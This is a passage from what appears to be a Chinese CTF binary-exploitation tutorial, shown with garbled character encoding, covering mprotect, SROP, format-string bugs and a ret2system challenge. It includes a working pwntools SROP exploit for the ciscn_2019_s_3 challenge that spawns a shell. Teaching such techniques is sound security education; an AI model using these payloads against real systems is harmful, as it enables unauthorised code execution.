å³PROT_READï¼šå¯è¯»ï¼Œå€¼åŠ  1</p><p>å¯å†™æƒé™ å³PROT_WRITEï¼šå¯è¯»ï¼Œ å€¼åŠ  2</p><p>å¯æ‰§è¡Œæƒé™ å³PROT_EXECï¼šå¯æ‰§è¡Œï¼Œå€¼åŠ  4</p><p>ä¾‹å¦‚ï¼šæˆ‘ä»¬è¦å°†æŸå—å†…å­˜åŒºåŸŸæƒé™è®¾ç½®ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œé‚£ä¹ˆmprotectå‡½æ•°ä¸­protå‚æ•°ä¾¿åº”è¯¥æ˜¯1+2+4=7ã€‚</p></li></ul><p>æ€è·¯å°±å¯ä»¥è½¬å˜æˆé€šè¿‡mprotectæ”¹å˜bssæ®µä¸ºå¯è¯»å†™, ä¼ å…¥shellcode, ç„¶åæ‰§è¡Œget shell</p><p>å‰é¢éƒ½æ˜¯ä¸€æ ·éœ€è¦é€šè¿‡æ³„éœ²libcæ¥æ‰¾åˆ°mprotectï¼Œåé¢å°±æ˜¯è°ƒç”¨mprotectæ”¹å˜bssæ®µæ‰§è¡Œæƒé™ï¼Œä¹‹åå†å°†asm(<a href="http://shellcraft.sh">shellcraft.sh</a>())å†™å…¥bssæ®µåæ‰§è¡Œbssæ®µçš„ä»£ç å³å¯ã€‚</p><p>ä½†æ˜¯è¿™æ ·å†™å®Œä¹‹åå‘ç°å¿…é¡»è¦å­˜åœ¨libcæºæ–‡ä»¶æ‰å¯ä»¥ï¼Œå› ä¸ºpltè¡¨ä¸­å¹¶æ²¡æœ‰mprotectå‡½æ•°ï¼Œè¦ä¹ˆå°±åªèƒ½ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ¥å†™ã€‚å› æ­¤ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿œç¨‹å¹¶æ²¡æœ‰æ‰“é€šè¿™é“é¢˜ï¼Œç¬”è€…çš„ä»£ç ä¹Ÿä¸æ”¾å‡ºæ¥çŒ®ä¸‘äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šè„šæœ¬ç¤ºä¾‹ã€‚</p><h2 id="ret2reg">ret2reg</h2><h1 id="07-é«˜çº§ROP">07 é«˜çº§ROP</h1><h2 id="SROP">SROP</h2><p>å½“æˆ‘ä»¬åœ¨æ„é€ æº¢å‡ºæ—¶æœ‰syscallä½†æ˜¯æ²¡æœ‰æ“æ§raxçš„ROPgadgetï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨SROPæ§åˆ¶å¯„å­˜å™¨å€¼ã€‚</p><h3 id="signal-æœºåˆ¶">signal æœºåˆ¶</h3><p>signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¿¡å·æœºåˆ¶å¸¸è§çš„æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ProcessOfSignalHandlering.png" alt="ProcessOfSignalHandlering"></p><ol><li>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ signal æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚</li><li>å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œ<strong>ä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º Signal Frameã€‚**éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ã€‚**ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ sigreturn ä»£ç ã€‚</li><li>signal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 119(0x77)ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15(0xf)ã€‚</li></ol><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/signal2-stack.png" alt="signal2-stack"></p><p>ç”±äºpwntoolsç°åœ¨å·²ç»æ”¯æŒæ„é€ signal Frameï¼Œå› æ­¤æˆ‘ä»¬å°±ä¸çœ‹å…·ä½“çš„ä»£ç äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡ŒæŸ¥çœ‹ã€‚</p><h3 id="æ”»å‡»åŸç†">æ”»å‡»åŸç†</h3><p>ä»”ç»†å›é¡¾ä¸€ä¸‹å†…æ ¸åœ¨ signal ä¿¡å·å¤„ç†çš„è¿‡ç¨‹ä¸­çš„å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå†…æ ¸ä¸»è¦åšçš„å·¥ä½œå°±æ˜¯ä¸ºè¿›ç¨‹ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æ¢å¤ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸»è¦çš„å˜åŠ¨éƒ½åœ¨ Signal Frame ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li>Signal Frame è¢«ä¿å­˜åœ¨ç”¨æˆ·çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ˜¯å¯ä»¥è¯»å†™çš„ã€‚</li><li>ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ (kernel agnostic about signal handlers)ï¼Œå®ƒå¹¶ä¸ä¼šå»è®°å½•è¿™ä¸ª signal å¯¹åº”çš„ Signal Frameï¼Œæ‰€ä»¥å½“æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæ­¤æ—¶çš„ Signal Frame å¹¶ä¸ä¸€å®šæ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„ Signal Frameã€‚</li></ul><p>è¯´åˆ°è¿™é‡Œï¼Œå…¶å®ï¼ŒSROP çš„åŸºæœ¬åˆ©ç”¨åŸç†ä¹Ÿå°±å‡ºç°äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ç”¨æˆ·åœ°å€ç©ºé—´çš„æ•°æ®å’Œç»“æ„é—´æ¥æ§åˆ¶å¯„å­˜å™¨çš„å€¼ã€‚ä¸‹é¢ä¸¾ä¸¤ä¸ªç®€å•çš„ä¾‹å­ã€‚</p><h3 id="åˆ©ç”¨">åˆ©ç”¨</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬å‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æˆ·è¿›ç¨‹çš„æ ˆï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª Signal Frameï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œä»¥ 64 ä½ä¸ºä¾‹å­ï¼Œç»™å‡º Signal Frame æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/srop-example-1.png" alt="signal2-stack"></p><p>å½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellã€‚</p><p>ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯å•ç‹¬çš„è·å¾—ä¸€ä¸ª shellã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯ã€‚</p><ul><li><strong>æ§åˆ¶æ ˆæŒ‡é’ˆã€‚</strong></li><li><strong>æŠŠåŸæ¥ rip æŒ‡å‘çš„<code>syscall</code> gadget æ¢æˆ<code>syscall; ret</code> gadgetã€‚</strong></li></ul><p>å¦‚ä¸‹å›¾æ‰€ç¤º ï¼Œè¿™æ ·å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚</p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ„é€  ROP æ”»å‡»çš„æ—¶å€™ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</p><ul><li><strong>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹</strong></li><li>éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€<ul><li><strong>â€œ/bin/shâ€</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>éœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª sigal frame</li></ul></blockquote><h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3><p>æ¥ä¸€é“ciscn_2019_s_3ï¼Œå…³äºSROPçš„é¢˜ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119152544417.png" alt="image-20251119152544417"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119152600545.png" alt="image-20251119152600545"></p><p>é¦–å…ˆçœ‹è¿™é“é¢˜å‘ç°æ˜¯æ ˆæº¢å‡ºä¹‹åï¼Œåœ¨ç¨‹åºä¸­å¹¶æœªæ‰¾åˆ°ä»»ä½•å…³äºsystemå‡½æ•°å’Œ&quot;/bin/sh&quot;å­—ç¬¦ä¸²çš„ä»»ä½•ä¿¡æ¯ï¼Œè€Œåœ¨64ä½æ“ä½œç³»ç»Ÿä¸­ï¼Œä¼ å‚éƒ½æ˜¯é€šè¿‡å¯„å­˜å™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ§åˆ¶å¯„å­˜å™¨çš„æ–¹æ³•ï¼Œè¿™é‡Œè§‚å¯Ÿä¹‹åå‘ç°ç¨‹åºç»™å‡ºäº†gadgetså‡½æ•°ï¼Œåœ¨å†…éƒ¨å°†raxèµ‹å€¼ä¸º0xfï¼Œä¸éš¾æƒ³åˆ°è¿™å°±æ˜¯SROPæ‰€éœ€è¦çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå› æ­¤åœ¨è¿™ä¹‹åå†è§¦å‘syscallå³å¯ï¼Œæ‰¾ä¸€ä¸‹syscallåœ¨å“ª</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119202415166.png" alt="image-20251119202415166"></p><p>æ‰¾åˆ°ä¹‹åå°±å¯ä»¥æ„é€ execveæˆ–systemç³»ç»Ÿè°ƒç”¨äº†ï¼Œä½†æ˜¯è¿˜éœ€è¦ä¸€ä¸ª&quot;/bin/sh&quot;å­—ç¬¦ä¸²åŠåœ°å€ï¼Œè¿™æ—¶å€™æˆ‘ä»¬æœ‰ä¸¤ç§æ„é€ æ–¹å¼ï¼Œç¬¬ä¸€ç§æ˜¯å¤šæ¬¡è°ƒç”¨sigreturnï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨readæˆ–getè¯»å…¥&quot;/bin/sh&quot;åˆ°bssæ®µï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨sigreturnç›´æ¥è°ƒç”¨systemã€‚ç¬¬äºŒç§æ–¹å¼å°±æ˜¯ç›´æ¥åœ¨æº¢å‡ºçš„æ—¶å€™å°†&quot;/bin/sh&quot;å†™å…¥ï¼Œç”±äºè¿™æ—¶å€™å†™å…¥çš„ä½ç½®åœ¨æ ˆä¸Šï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ³„éœ²æ ˆåœ°å€ï¼Œä½†æ˜¯ä¸å¾—ä¸è¯´è¿™æ ·åšæ¯”ç¬¬ä¸€ç§æ–¹å¼æ›´åŠ ä¼˜é›…ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251120110735787.png" alt="image-20251120110735787"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ¥æ³„éœ²æ ˆåœ°å€å‘¢ï¼Œæˆ‘ä»¬å…ˆè°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹æº¢å‡ºéœ€è¦å¡«å……çš„å­—ç¬¦æ•°ï¼Œè¿™é‡Œå‘ç°å½“æ‰§è¡Œreadæ—¶ï¼Œrbp==rspï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶ä¸éœ€è¦å¤šå¡«å……8å­—èŠ‚ä»¥è¦†ç›–è¿”å›åœ°å€ã€‚å¹¶ä¸”è§‚å¯Ÿåˆ°ä¸‹ä¸€ä¸ªæ ˆä¸­å­˜æ”¾çš„ä¹‹å‰çš„æ ˆæŒ‡é’ˆä¸º0x7fffffffe538ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“ç›¸å¯¹äºæˆ‘ä»¬å†™å…¥çš„å­—ç¬¦ä¸²çš„ä½ç½®0x7fffffffe410ï¼Œå…¶åç§»åœ°å€ä¸º0x128ã€‚</p><p>è€Œè™½ç„¶æ ˆçš„åœ°å€ä¼šå˜åŒ–ï¼Œä½†æ˜¯æ ˆä¸Šåç§»å¹¶ä¸ä¼šå˜ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸‹ä¸€ä¸ªæ ˆä¸­å­˜æ”¾çš„ä¹‹å‰çš„æ ˆæŒ‡é’ˆå’Œæˆ‘ä»¬å†™å…¥çš„å­—ç¬¦ä¸²çš„ç›¸å¯¹ä½ç½®æ˜¯å›ºå®šçš„ï¼Œå› æ­¤æˆ‘ä»¬åªè¦æ³„éœ²å‡ºä¸‹ä¸€ä¸ªæ ˆä¸­å­˜æ”¾çš„æ•°æ®ï¼Œå†ä½¿ç”¨è¿™ä¸ªæ•°æ®å‡å»åç§»åœ°å€å°±èƒ½å¾—åˆ°ç¨‹åºè¿è¡Œæ—¶æˆ‘ä»¬å†™å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119202220606.png" alt="image-20251119202220606"></p><p>æ€è·¯åŸºæœ¬ä¸Šå°±æ˜¯è¿™æ ·ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦æ„é€ POCä¸€æ­¥æ­¥pwnæ‰ï¼š</p><p>ä¸‹é¢ç»™å‡ºpwntoolsé›†æˆçš„SROPæ”»å‡»æ„é€ æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">frame=SigreturnFrame()<br>frame.rax=<span class="hljs-number">59</span><br>frame.rdi=binsh<br>frame.rip=syscall<br>frame.rsi=<span class="hljs-number">0</span><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(gadget)+p64(syscall)+<span class="hljs-built_in">str</span>(frame)<br>p.send(payload)<br></code></pre></td></tr></table></figure><p>POCæ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#Important!!!!!!!!!!Important!!!!!!!!!!</span><br>vuln_addr = <span class="hljs-number">0x004004ED</span><br><br>sig_addr = <span class="hljs-number">0x04004DA</span><br><br>syscall_addr = <span class="hljs-number">0x0400501</span><br><br>offset = <span class="hljs-number">0x128</span><br>payload1 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)+p64(vuln_addr)<br>p.send(payload1)<br><br>binsh = u64(p.recv()[<span class="hljs-number">32</span>:<span class="hljs-number">40</span>]) - offset<br>log.success(<span class="hljs-string">&#x27;binsh = &#x27;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = binsh<br>frame.rsi = <span class="hljs-number">0x0</span><br>frame.rdx = <span class="hljs-number">0x0</span><br>frame.rip = syscall_addr<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span>+p64(sig_addr)+p64(syscall_addr)+<span class="hljs-built_in">bytes</span>(frame)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="08-Format-String">08 Format String</h1><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆè‹±è¯­ï¼šformat stringï¼‰æ˜¯ä¸€äº›ç¨‹åºè®¾è®¡è¯­è¨€çš„è¾“å…¥/è¾“å‡ºåº“ä¸­èƒ½å°†å­—ç¬¦ä¸²å‚æ•°è½¬æ¢ä¸ºå¦ä¸€ç§å½¢å¼è¾“å‡ºçš„å‡½æ•°ã€‚ä¾‹å¦‚Cã€C++ç­‰ç¨‹åºè®¾è®¡è¯­è¨€çš„printfç±»å‡½æ•°ï¼Œå…¶ä¸­çš„è½¬æ¢è¯´æ˜ï¼ˆconversion specificationï¼‰ç”¨äºæŠŠéšåå¯¹åº”çš„0ä¸ªæˆ–å¤šä¸ªå‡½æ•°å‚æ•°è½¬æ¢ä¸ºç›¸åº”çš„æ ¼å¼è¾“å‡ºï¼›æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­è½¬æ¢è¯´æ˜ä»¥å¤–çš„å…¶å®ƒå­—ç¬¦åŸæ ·è¾“å‡ºã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/Printf.svg.png" alt="Printf.svg"></p><h2 id="åŸç†">åŸç†</h2><p>æˆ‘ä»¬ä¸Šé¢è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥è¿›è¡Œè§£æçš„ ã€‚<strong>é‚£ä¹ˆç›¸åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿè‡ªç„¶æ˜¯ç”±è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€æ§åˆ¶</strong>ã€‚æ¯”å¦‚è¯´â€™%sâ€™è¡¨æ˜æˆ‘ä»¬ä¼šè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ã€‚</p><p>å¯¹äºä¸Šé¢çš„ä¾‹å­ï¼Œåœ¨è¿›å…¥ printf å‡½æ•°çš„ä¹‹å‰ (å³è¿˜æ²¡æœ‰è°ƒç”¨ printf)ï¼Œæ ˆä¸Šçš„å¸ƒå±€ç”±é«˜åœ°å€åˆ°ä½åœ°å€ä¾æ¬¡å¦‚ä¸‹ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">some</span> value<br><span class="hljs-number">3.14</span><br><span class="hljs-number">123456</span><br>addr of <span class="hljs-string">&quot;red&quot;</span><br>addr of format <span class="hljs-built_in">string</span>: Color <span class="hljs-built_in">%s</span>...<br></code></pre></td></tr></table></figure><p>åœ¨è¿›å…¥ printf ä¹‹åï¼Œå‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µ</p><ul><li>å½“å‰å­—ç¬¦ä¸æ˜¯ %ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºã€‚</li><li>å½“å‰å­—ç¬¦æ˜¯ %ï¼Œ ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦<ul><li>å¦‚æœæ²¡æœ‰å­—ç¬¦ï¼ŒæŠ¥é”™</li><li>å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ %, è¾“å‡º %</li><li>å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡º</li></ul></li></ul><p>é‚£ä¹ˆå‡è®¾ï¼Œæ­¤æ—¶æˆ‘ä»¬åœ¨ç¼–å†™ç¨‹åºæ—¶å€™ï¼Œå†™æˆäº†ä¸‹é¢çš„æ ·å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å¹¶æ²¡æœ‰æä¾›å‚æ•°ï¼Œé‚£ä¹ˆç¨‹åºä¼šå¦‚ä½•è¿è¡Œå‘¢ï¼Ÿç¨‹åºç…§æ ·ä¼šè¿è¡Œï¼Œä¼šå°†æ ˆä¸Šå­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸Šé¢çš„ä¸‰ä¸ªå˜é‡åˆ†åˆ«è§£æä¸º</p><ol><li>è§£æå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æ•´å½¢å€¼</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æµ®ç‚¹å€¼</li></ol><p>å¯¹äº 2ï¼Œ3 æ¥è¯´å€’è¿˜æ— å¦¨ï¼Œä½†æ˜¯å¯¹äºå¯¹äº 1 æ¥è¯´ï¼Œå¦‚æœæä¾›äº†ä¸€ä¸ªä¸å¯è®¿é—®åœ°å€ï¼Œæ¯”å¦‚ 0ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå› æ­¤è€Œå´©æºƒã€‚</p><p>è¿™åŸºæœ¬å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åŸºæœ¬åŸç†äº†ã€‚</p><h2 id="åˆ©ç”¨-2">åˆ©ç”¨</h2><h1 id="09-å¤©ç’‡æˆ˜é˜Ÿ2025æ‹›æ–°">09 å¤©ç’‡æˆ˜é˜Ÿ2025æ‹›æ–°</h1><h2 id="ret">ret</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011153617006.png" alt="image-20251011153617006"></p><p>ç®€å•æ ˆæº¢å‡ºï¼Œæœ‰systemå‡½æ•°æœ‰&quot;/bin/sh&quot;ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011153635272.png" alt="image-20251011153635272"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011153952599.png" alt="image-20251011153952599"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011154013118.png" alt="image-20251011154013118"></p><p>æ¥ä¸‹æ¥è°ƒè¯•çœ‹éœ€è¦å¡«å……çš„å­—ç¬¦æ•°ä»¥åŠè¦†ç›–è¿”å›åœ°å€ä¸ºsystemå³å¯ï¼Œç”±äºæ˜¯64ä½ç¨‹åºï¼Œå‡½æ•°è°ƒç”¨æ—¶çš„å‚æ•°é¡ºåºç¬¬ä¸€ä¸ªä¸ºrdiï¼ˆå‰æ–‡æœ‰è¯¦ç»†é¡ºåºæè¿°ï¼‰ã€‚ä¹Ÿå°±æ˜¯æ„é€ çš„æ ˆéœ€è¦å°†è¿”å›åœ°å€è¦†ç›–ä¸ºpop rdiï¼Œret; éšåç´§è·Ÿ&quot;/bin/sh&quot;çš„åœ°å€ï¼Œéšåå†è°ƒç”¨systemå‡½æ•°å³å¯ã€‚</p><p>æ‰¾pop rdiï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011170721170.png" alt="image-20251011170721170"></p><p>è¿™é‡Œå†™å®Œä¹‹åå‘ç°ä¸€ç›´æŠ¥é”™ï¼Œç”±äºæ˜¯64ä½æ“ä½œç³»ç»Ÿï¼Œåœ¨ x86_64 ä¸Šï¼Œä» ROP é“¾ â€œret åˆ°ä¸€ä¸ªå‡½æ•°ï¼ˆsystemï¼‰â€ è€Œä¸æ˜¯é€šè¿‡ call æŒ‡ä»¤ï¼Œä¼šé€ æˆå‡½æ•°å…¥å£æ—¶ <code>RSP</code> æ²¡æœ‰æ»¡è¶³ 16 å­—èŠ‚å¯¹é½ï¼ŒGLIBC çš„æŸäº›å®ç°ä¼šåœ¨å‡½æ•°å†…éƒ¨ä¾èµ–å¯¹é½ï¼ˆå¯¼è‡´ crashï¼‰ã€‚æ’å…¥ä¸€ä¸ªretå³å¯ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆè¦æ’ <code>ret</code>ï¼Ÿ</p><ul><li>x86_64 è¦æ±‚åœ¨å‡½æ•°è¢« <code>call</code> è¿›å…¥æ—¶ï¼šRSP åœ¨è¢« <code>call</code> æŒ‡ä»¤å…¥æ ˆè¿”å›åœ°å€ååº”æ˜¯ 16 å­—èŠ‚å¯¹é½ï¼ˆå‡½æ•°å…¥å£æ—¶ RSP % 16 == 0ï¼‰ã€‚</li><li>ROP ç”¨ <code>ret</code>/gadget é“¾è·³è½¬åˆ° <code>system</code> æ—¶ï¼Œæ²¡æœ‰ <code>call</code> çš„é‚£ä¸€æ­¥ï¼Œå¯èƒ½å¯¼è‡´ <code>RSP</code> åœ¨ <code>system</code> å…¥å£å¤„å˜ä¸ºäº† 8 